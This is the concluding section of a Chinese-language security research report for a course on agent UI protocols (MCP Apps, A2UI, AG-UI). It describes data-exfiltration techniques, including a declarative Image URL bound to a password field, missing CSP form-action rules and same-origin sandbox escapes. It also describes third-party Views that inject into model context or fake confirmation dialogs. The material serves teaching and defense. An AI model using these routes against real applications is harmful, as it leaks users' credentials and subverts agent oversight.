- **L16（Agent 的前端）**：L16 给了「渲染即发送」「决策权在模型、渲染权在你」「四种中断」。L16x 把「渲染即发送」推进到**声明式**场景（A2UI 的 Image/formatString 不执行代码也能外泄），把「决策权/渲染权」对到三种协议的不同答案，把「中断」对到 AG-UI 的 interrupt/resume。不重复讲 SSE 分帧（那是 L16 的 `wire.ts`）。

## 12. 结尾：top 5、无一手来源清单、API 草图、课时主题

### 12.1 最承重的 5 个反转

1. **「沙箱 iframe 是边界」是错的；边界是代理文档的 origin。** `allow-scripts + allow-same-origin` 在同源 srcdoc 上等于没有沙箱（§3.1、§10 B1 实测）；basic-host 的内层是 `document.write` 写的、与代理同源（§2.7）；ext-apps 自己的 commit `5e4839d1` 明说 "isolation comes from the separate port, not the sandbox attribute"（§8.4）。**学员的本能「加了 sandbox 就安全」会直接误导他们。**
2. **SDK 的便利方法不替你执行可见性；「给模型看」和「给 app 调」是两个独立、默认相反的方向。** ext-apps 的 `AppBridge.connect()` 自动转发 `tools/call` 不查可见性（§2.4），AG-UI 中间件只做了 model 方向、漏了 app 方向（§6.5）。规范默认「省略 = 双方可见」，而 app 方向一旦 fail-open 就是越权。**可见性必须由宿主显式、双向、fail-closed 地判。**
3. **声明式 UI 消除了「执行」，但没消除「加载」；数据绑定让加载能携带用户输入。** A2UI 的 `Image.url` 接受 `formatString('${/form/password}')`，渲染即发请求、每次按键再发一次（§5.5），而文档同时写着 "No code execution risk"。**「不执行代码」≠「不外泄」——这是 L16『渲染即发送』在声明式世界的升级版，且比 markdown 图片更糟（能带到模型看不见的用户输入）。**
4. **`default-src 'none'` 给人「全关了」的错觉，但表单目标和 base-uri 不在它的回退范围内。** `form-action` 是导航指令、不回退到 `default-src`（CSP3 §6.4，§10 E4 实测）。AI SDK 的 CSP 构造器因此**显式**写 `form-action 'none'`、`base-uri 'none'`；A2UI 内层给了 `allow-forms` 却把 CSP 交给第三方自己写。**没写 `form-action` = 不限制表单外泄。**
5. **第三方 UI 是一个新的、默认不可信的参数来源（L14 的 app 来源）。** View 发起的 `tools/call`/`ui/message`/`update-model-context` 不是用户、不是模型，却能进工具、进「用户消息」、进模型上下文（§8.1）。而 View 能画出和宿主像素级一致的确认框（clickjacking 反向，§3.6）。**破坏性确认必须由宿主在 iframe 之外渲染，不能信 View 里的按钮。**

### 12.2 没有一手来源、必须明说的断言

本报告严格区分了 `[P]/[P2]/[S]`。以下是**查不到一手数字/事实**、报告中已按此口径处理的点：

- **扩展在 2026-07-28 协议里到底怎么承载**（`capabilities.extensions` 的精确线格式）——spec 文本用的是 `io.modelcontextprotocol/ui` 名称，但承载结构我没找到逐字定义；报告只用了能引到的部分。
- **teardown 的超时值**：`ui/resource-teardown` 是 request，规范没给宿主应等多久（§2.5），**无一手数字**。
- **宿主注入的 `styles.css.fonts` 是否自动进 View 的 CSP**（§2.6）——规范未写，标 `[P2]`。
- **各宿主真实的 origin / 存储隔离行为**：`claudemcpcontent.com` 的子域算法有一手（§9），但「不同 server 的 App 是否共享存储」取决于宿主实现，basic-host 的做法不代表 Claude（docs 自己说 "not as a guarantee of host behavior"）——**无一手结论**。
- **采用规模的任何数字**：宿主清单是官方的（§9），但使用量、App 数量没有可核实来源；A2UI 的生产部署是项目方自述、利益相关（§5.9）。
- **A2UI 环/多父/深度上限的处理**：规范对这些**只字未提**（grep `cycl`/`circular` 零命中，§5.3），所以 lab 的深度上限是一个**声明出来的常量**，不是引用规范。
- **没有针对这些库的公开 CVE/GHSA**（§8.4，查证 2026-10-12 为空）；唯一相关的是依赖 `fast-json-patch` 的历史 advisory。
- **MCP-UI 两个包的细节**（`@mcp-ui/client@7.1.1`、`@mcp-ui/server@6.1.0` 已 pack 但未逐行读）——报告只用到官方文档把它列为「框架选项」这一事实（§9），未就其内部实现下任何结论。

### 12.3 Lab API 草图摘要

`labs/shared/genui.{ts,py}`（纯函数，零依赖、零 I/O、零模型）九组：① 可见性解析 + 双向判定（app 方向 fail-closed）+ 桥路由（方法白名单 + 同 server）；② 出站队列（`initialized` 与审批双门控）；③ 来源/origin 校验（拒绝 `"null"` 白名单，不透明源只能 `*`）；④ CSP/allow 构造（规范化后查分隔符，显式 `form-action 'none'`，allow 用 `;`）；⑤ sandbox 属性审计；⑥ 尺寸钳制；⑦ 原子 JSON Patch（深拷贝回滚 + 严格 `test` + 禁原型 + RFC6901 下标）；⑧ A2UI 树/目录校验（一个 root、环、多父、URL 属性必须字面量）；⑨ `ui/message` 来源标注。学员文件 `l16x/genui.*` 6 个 TODO（4★ + 2★★），6 个两语言逐字节一致的观测实验，`verify` 48 条断言（两语言同条数、每条映射一个 INV）。可选 `l16x/ui/` 纯本地演示页。

### 12.4 建议课时主题（4–5 个，均有本报告证据支撑）

1. **「沙箱不是边界，origin 才是」**——从 `allow-same-origin` 的同源陷阱到双层代理，用 §10 B1/B6 实测和 ext-apps 的三个安全 commit（§8.4）。证据充分，是最硬的一课。
2. **「可见性是两个方向，SDK 不替你判」**——MCP Apps 的 `visibility`、AG-UI 中间件的半截实现、A2UI 的 `allowedCallers` 三者并置，落到 lab 的 `routeAppRequest`。证据：§2.3/2.4/6.5/5.7 + §10.1 实测。
3. **「声明式也会外泄：渲染即发送 2.0」**——A2UI 的 `Image`+`formatString`+双向绑定，对比 L16 的 markdown 图片，落到 lab 的 `validateTree` URL 白名单。证据：§5.5（全链条一手引用）。
4. **「`default-src 'none'` 骗了你」**——CSP 的回退边界（form-action/base-uri 不在内）、meta vs header、srcdoc 继承，落到 lab 的 `buildCsp`。证据：§3.4/8.2 + §10.4 CSP 继承与 E4 实测。
5. **「JSON Patch 是一个攻击面」**——RFC 6902 原子性/严格 test、RFC 6901 下标、原型污染、Python `True==1` 跨语言坑，落到 lab 的 `applyPatchAtomic`。证据：§6.2 + §10.3 两语言实测 + §8.4 的历史 advisory。

（备选第 6 课：「三种协议、三种渲染权」——MCP Apps / A2UI / Vercel 生成式 UI / AG-UI 四者的分层与组合，适合作为 L16x 的开场导览，证据见 §5.1 对比表与 §7。）
